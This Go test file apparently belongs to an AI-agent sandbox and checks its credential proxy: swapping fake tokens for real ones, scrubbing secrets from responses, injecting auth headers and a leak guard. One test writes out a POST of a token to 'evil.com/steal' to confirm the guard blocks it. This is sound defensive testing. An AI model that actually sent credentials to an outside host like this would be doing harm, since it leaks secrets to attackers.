package session

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/agentsh/agentsh/internal/policy"
	"github.com/agentsh/agentsh/internal/proxy"
	"github.com/agentsh/agentsh/internal/proxy/secrets"
)

func TestCredentialPipeline_EndToEnd(t *testing.T) {
	// Set up a memory provider with a known secret.
	realSecret := []byte("ghp_realABCDEFGHIJKLMNOPQRSTUVWXYZ123456")
	mp := &memoryProvider{
		secrets: map[string][]byte{
			"github/token": realSecret,
		},
	}

	services := []ServiceConfig{
		{
			Name:       "github",
			SecretRef:  secrets.SecretRef{Scheme: "memory", Host: "github", Path: "token"},
			FakeFormat: "ghp_{rand:36}",
		},
	}

	// Bootstrap credentials.
	table, cleanup, err := BootstrapCredentials(context.Background(), mp, services)
	if err != nil {
		t.Fatalf("BootstrapCredentials: %v", err)
	}
	defer cleanup()

	// Get the fake that was generated.
	fake, ok := table.FakeForService("github")
	if !ok {
		t.Fatal("no fake for github")
	}

	// Verify fake->real substitution.
	reqBody := []byte(`{"token":"` + string(fake) + `"}`)
	replaced := table.ReplaceFakeToReal(reqBody)
	wantReq := []byte(`{"token":"` + string(realSecret) + `"}`)
	if !bytes.Equal(replaced, wantReq) {
		t.Errorf("ReplaceFakeToReal:\n  got:  %s\n  want: %s", replaced, wantReq)
	}

	// Verify real->fake scrubbing.
	respBody := []byte(`{"echoed":"` + string(realSecret) + `"}`)
	scrubbed := table.ReplaceRealToFake(respBody)
	wantResp := []byte(`{"echoed":"` + string(fake) + `"}`)
	if !bytes.Equal(scrubbed, wantResp) {
		t.Errorf("ReplaceRealToFake:\n  got:  %s\n  want: %s", scrubbed, wantResp)
	}

	// Verify leak guard detects fake in body.
	serviceName, found := table.ContainsFake(reqBody)
	if !found {
		t.Error("ContainsFake should detect fake in request body")
	}
	if serviceName != "github" {
		t.Errorf("serviceName = %q, want %q", serviceName, "github")
	}

	// Verify no false positive.
	cleanBody := []byte(`{"message":"hello world"}`)
	_, found = table.ContainsFake(cleanBody)
	if found {
		t.Error("ContainsFake should not flag clean body")
	}
}

func TestIntegration_PolicyYAML_FullFlow(t *testing.T) {
	// Setup: create a memory provider with a known secret.
	memProvider := &memoryProvider{
		secrets: map[string][]byte{
			"agentsh/github_token": []byte("ghp_REAL1234567890abcdef12345678901234"),
		},
	}

	// Exercise resolver path to verify HTTPService→config wiring.
	httpServices := []policy.HTTPService{
		{
			Name:     "github",
			Upstream: "https://api.github.com",
			Secret:   &policy.HTTPServiceSecret{Ref: "keyring://agentsh/github_token", Format: "ghp_{rand:34}"},
			Inject:   &policy.HTTPServiceInject{Header: &policy.HTTPServiceInjectHeader{
				Name: "Authorization", Template: "Bearer {{secret}}",
			}},
		},
	}
	resolved, err := ResolveServiceConfigs(httpServices)
	if err != nil {
		t.Fatalf("ResolveServiceConfigs: %v", err)
	}

	// Bootstrap credentials.
	table, cleanup, err := BootstrapCredentials(context.Background(), memProvider, resolved.ServiceConfigs)
	if err != nil {
		t.Fatalf("BootstrapCredentials: %v", err)
	}
	defer cleanup()

	// Verify fake was generated and is in the table.
	fake, ok := table.FakeForService("github")
	if !ok {
		t.Fatal("no fake for github")
	}

	// Verify fake→real substitution.
	body := []byte(fmt.Sprintf(`{"token":"%s"}`, fake))
	replaced := table.ReplaceFakeToReal(body)
	if !bytes.Contains(replaced, []byte("ghp_REAL1234567890abcdef12345678901234")) {
		t.Errorf("body not substituted: %s", replaced)
	}
	if bytes.Contains(replaced, fake) {
		t.Errorf("fake still present after substitution: %s", replaced)
	}

	// Verify header injection using resolved InjectHeaders.
	if len(resolved.InjectHeaders) == 0 {
		t.Fatal("expected at least one InjectHeader from resolved config")
	}
	ih := resolved.InjectHeaders[0]
	hook := proxy.NewHeaderInjectionHook(ih.ServiceName, ih.HeaderName, ih.Template, table)
	req := httptest.NewRequest(http.MethodPost, "http://api.github.com/repos", nil)
	if err := hook.PreHook(req, &proxy.RequestContext{ServiceName: "github"}); err != nil {
		t.Fatal(err)
	}
	authHeader := req.Header.Get("Authorization")
	if authHeader != "Bearer ghp_REAL1234567890abcdef12345678901234" {
		t.Errorf("Authorization = %q, want Bearer ghp_REAL...", authHeader)
	}

	// Verify real→fake scrubbing on response.
	respBody := []byte(`{"echoed":"ghp_REAL1234567890abcdef12345678901234"}`)
	scrubbed := table.ReplaceRealToFake(respBody)
	if !bytes.Contains(scrubbed, fake) {
		t.Errorf("response not scrubbed: %s", scrubbed)
	}
	if bytes.Contains(scrubbed, []byte("ghp_REAL1234567890abcdef12345678901234")) {
		t.Errorf("real credential still present after scrubbing: %s", scrubbed)
	}

	// Verify leak guard allows matched service's own fake.
	leakGuard := proxy.NewLeakGuardHook(table, slog.Default())
	leakReq := httptest.NewRequest(http.MethodPost, "http://api.github.com/repos",
		bytes.NewReader([]byte(fmt.Sprintf(`{"t":"%s"}`, fake))))
	err = leakGuard.PreHook(leakReq, &proxy.RequestContext{ServiceName: "github"})
	if err != nil {
		t.Errorf("LeakGuard should allow matched service's own fake: %v", err)
	}

	// Verify leak guard blocks unmatched host.
	leakReq2 := httptest.NewRequest(http.MethodPost, "http://evil.com/steal",
		bytes.NewReader([]byte(fmt.Sprintf(`{"t":"%s"}`, fake))))
	err = leakGuard.PreHook(leakReq2, &proxy.RequestContext{})
	if err == nil {
		t.Error("LeakGuard should block fakes to unmatched hosts")
	}
}

func TestScrubResponse_CompositionFlow(t *testing.T) {
	scrubTrue := true
	scrubFalse := false
	svcs := []policy.HTTPService{
		{
			Name:          "github",
			Upstream:      "https://api.github.com",
			Secret:        &policy.HTTPServiceSecret{Ref: "keyring://agentsh/gh", Format: "ghp_{rand:36}"},
			ScrubResponse: &scrubTrue,
			Inject: &policy.HTTPServiceInject{
				Header: &policy.HTTPServiceInjectHeader{
					Name: "Authorization", Template: "Bearer {{secret}}",
				},
			},
		},
		{
			Name:          "stripe",
			Upstream:      "https://api.stripe.com",
			Secret:        &policy.HTTPServiceSecret{Ref: "keyring://agentsh/stripe", Format: "xk_test_{rand:24}"},
			ScrubResponse: &scrubFalse,
		},
	}

	resolved, err := ResolveServiceConfigs(svcs)
	if err != nil {
		t.Fatalf("ResolveServiceConfigs: %v", err)
	}

	// Verify scrub config: github explicit true, stripe explicit false.
	if !resolved.ScrubServices["github"] {
		t.Error("github should be in ScrubServices")
	}
	if resolved.ScrubServices["stripe"] {
		t.Error("stripe should NOT be in ScrubServices (explicit false)")
	}

	// Bootstrap credentials.
	mp := &memoryProvider{
		secrets: map[string][]byte{
			"agentsh/gh":     []byte("ghp_realABCDEFGHIJKLMNOPQRSTUVWXYZ123456"),
			"agentsh/stripe": []byte("xk_test_realABCDEFGHIJKLMNOPQRST"),
		},
	}
	table, cleanup, err := BootstrapCredentials(context.Background(), mp, resolved.ServiceConfigs)
	if err != nil {
		t.Fatalf("BootstrapCredentials: %v", err)
	}
	defer cleanup()

	// Verify credential scrubbing via CredsSubHook.
	credsHook := proxy.NewCredsSubHook(table, resolved.ScrubServices)

	// Response from github should be scrubbed (real → fake).
	ghRespBody := []byte(`{"echoed":"ghp_realABCDEFGHIJKLMNOPQRSTUVWXYZ123456"}`)
	ghResp := &http.Response{
		Body:          io.NopCloser(bytes.NewReader(ghRespBody)),
		ContentLength: int64(len(ghRespBody)),
	}
	if err := credsHook.PostHook(ghResp, &proxy.RequestContext{ServiceName: "github"}); err != nil {
		t.Fatalf("PostHook github: %v", err)
	}
	ghGot, _ := io.ReadAll(ghResp.Body)
	if bytes.Contains(ghGot, []byte("ghp_realABCDEFGHIJKLMNOPQRSTUVWXYZ123456")) {
		t.Error("github response should have real credential scrubbed")
	}

	// Response from stripe should NOT be scrubbed (scrub_response=false).
	stripeRespBody := []byte(`{"echoed":"xk_test_realABCDEFGHIJKLMNOPQRST"}`)
	stripeResp := &http.Response{
		Body:          io.NopCloser(bytes.NewReader(stripeRespBody)),
		ContentLength: int64(len(stripeRespBody)),
	}
	if err := credsHook.PostHook(stripeResp, &proxy.RequestContext{ServiceName: "stripe"}); err != nil {
		t.Fatalf("PostHook stripe: %v", err)
	}
	stripeGot, _ := io.ReadAll(stripeResp.Body)
	if !bytes.Contains(stripeGot, []byte("xk_test_realABCDEFGHIJKLMNOPQRST")) {
		t.Error("stripe response should NOT be scrubbed (scrub_response=false)")
	}
}
